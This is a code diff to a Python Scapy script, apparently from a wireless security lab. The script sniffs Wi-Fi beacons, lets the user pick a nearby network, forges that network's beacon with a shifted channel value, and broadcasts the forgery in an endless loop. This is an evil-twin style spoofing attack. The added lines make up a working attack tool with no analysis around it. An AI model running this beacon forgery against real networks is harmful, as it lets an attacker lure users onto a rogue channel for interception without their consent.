@@ -30,7 +30,7 @@ def callback(packet):
     if packet.haslayer(Dot11Beacon):
         # extract the MAC address of the network
         bssid = packet[Dot11].addr2
-        # get the name of it
+        # get the name of it and its strength
         ssid = packet[Dot11Elt].info.decode()
         try:
             dbm_signal = packet.dBm_AntSignal
@@ -40,8 +40,8 @@ def callback(packet):
         stats = packet[Dot11Beacon].network_stats()
         # get the channel of the AP
         channel = stats.get("channel")
+        # insert it in both table
         networks.loc[bssid] = (ssid, dbm_signal, channel, i)
-        
         networksBeacon.loc[bssid] = (ssid, packet)
     
     for index, row in networks.iterrows():
@@ -65,16 +65,24 @@ def create_packet(packet):
         bssid = packet[Dot11].addr2
         # get the name of it
         ssid = packet[Dot11Elt].info.decode()
-        try:
-            dbm_signal = packet.dBm_AntSignal
-        except:
-            dbm_signal = "N/A"
         # extract network stats
         stats = packet[Dot11Beacon].network_stats()
         # get the channel of the AP
         channel = stats.get("channel")
-        print(ssid, dbm_signal, channel)
-        
+        # calculate the new channel
+        newChannel = (channel + 6) % 11
+        # get the end of the original packet
+        oldEltend = packet[Dot11Elt][3]
+        # get the content of original packet
+        newPacket = packet
+        # change the DSset to the new calculate value. This will clear everything that follows 
+        newPacket[Dot11Elt][2] = Dot11Elt(ID='DSset', info=chr(newChannel), len=1) 
+        # concatenate the end of the packet with what we created before
+        finalPacket = newPacket/oldEltend
+        # send the packet until user stop it
+        sendp(finalPacket, iface=args.Interface, inter=0.10, loop=1)
+
+                
 
 if __name__ == "__main__":
     # interface name, check using iwconfig and pass it with -i argument
@@ -86,7 +94,7 @@ if __name__ == "__main__":
     channel_changer.start()
 
     # start sniffing
-    print("Sniff pendant " + str(args.Second) + " secondes, veuiller patienter\n")
+    print("Sniffing for " + str(args.Second) + " seconds, please wait\n")
     sniff(prn=callback, iface=interface, timeout=int(args.Second))
     print(networks)
 
@@ -96,15 +104,12 @@ if __name__ == "__main__":
     # Get the input of the user 
     userInput = int(input())
     userChoice = 0
+
+    # Ask the user which wifi he wants to emulate
     if(isinstance((userInput),int) and 0 < userInput <= len(networks)):
         userChoice = networks.loc[networks["Number"] == userInput].head().index.values[0]
-        print(userChoice) 
 
-    # for index, row in networksBeacon.iterrows():
-    #     print(index)
-    #     print(hexdump(row["Packet"]))
-
-
-
+    # Recover corresponding packet of the selected wifi
     packet = networksBeacon.loc[userChoice].values[1]
+
     create_packet(packet)
